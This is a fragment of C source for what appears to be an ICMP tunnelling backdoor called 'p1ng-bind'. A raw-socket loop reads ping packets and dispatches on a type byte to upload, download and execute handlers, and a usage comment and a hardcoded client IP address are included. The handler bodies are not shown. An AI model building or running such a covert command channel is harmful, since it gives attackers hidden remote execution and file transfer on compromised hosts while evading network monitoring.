    struct ip *st_ip;
    uint8_t ip_src[20]={0},ip_dst[20]={0};
    uint8_t pkt_type=0;	
    uint8_t pkt_size=0;	
    uint32_t icmp_buf_size = 50 * 1024;
	
    if ((protocol = getprotobyname("icmp")) == NULL)
    {
        perror("getprotobyname error");
        exit(1);
    }

    if ((sockfd = socket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0)
    {
        perror("socket error");
        exit(1);
    }
    setuid(getuid());
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &icmp_buf_size, sizeof(icmp_buf_size));
    pid = getpid();
    while(1){
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
        st_ip = (struct ip *) recvpacket;
        strcpy(ip_src,inet_ntoa(st_ip->ip_src));
        strcpy(ip_dst,inet_ntoa(st_ip->ip_dst));
        printf("\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
        iphdr_len = st_ip->ip_hl << 2;
        icmptotal_len = pkt_size - iphdr_len;
        if( icmptotal_len < 8){
            printf("\033[40;31m[-]\033[0mMalformed Message!\n");
            return;
        }
        else
            pkt_type=recvpacket[iphdr_len+16+8];
        switch(pkt_type)
        {
            case 1  :
                upload_responcer(recvpacket, pkt_size);
                break;
            case 2  :
                download_responcer(recvpacket, pkt_size);
                break;
            case 3  :
                execute_responcer(recvpacket, pkt_size);
                break;
            default :
                regular_responcer(recvpacket, pkt_size);            

        }
    }

}

int main(int argc, char *argv[]){
    //p1ng-bind
    //server: p1ng -S -c CIP
    //client: p1ng -C

    int32_t opt=0;
    uint8_t client_ip[16]="192.168.199.202";
    uint8_t btn_s=0;
    uint8_t btn_c=1;
    while((opt=getopt(argc,argv,"SCc:"))!=-1)
    {
        switch(opt)
        {
            case 'S':
                btn_s=1;
                btn_c=0;
                break;
            case 'C':
                btn_c=1;
                break;
            case 'c':
                strcpy(client_ip,optarg);break;
            default:
                btn_c=1;
        }
    }
    if((btn_s^btn_c)==0){
        printf("\033[40;33m[!]\033[0mCheck your command line argument!\n");
        exit(0);
    }
    if(btn_s){
        p1ng_server(client_ip);
    }
    if(btn_c){
        printf("[+]waiting for connection...\n");
        p1ng_client();
    }

    return 0;
}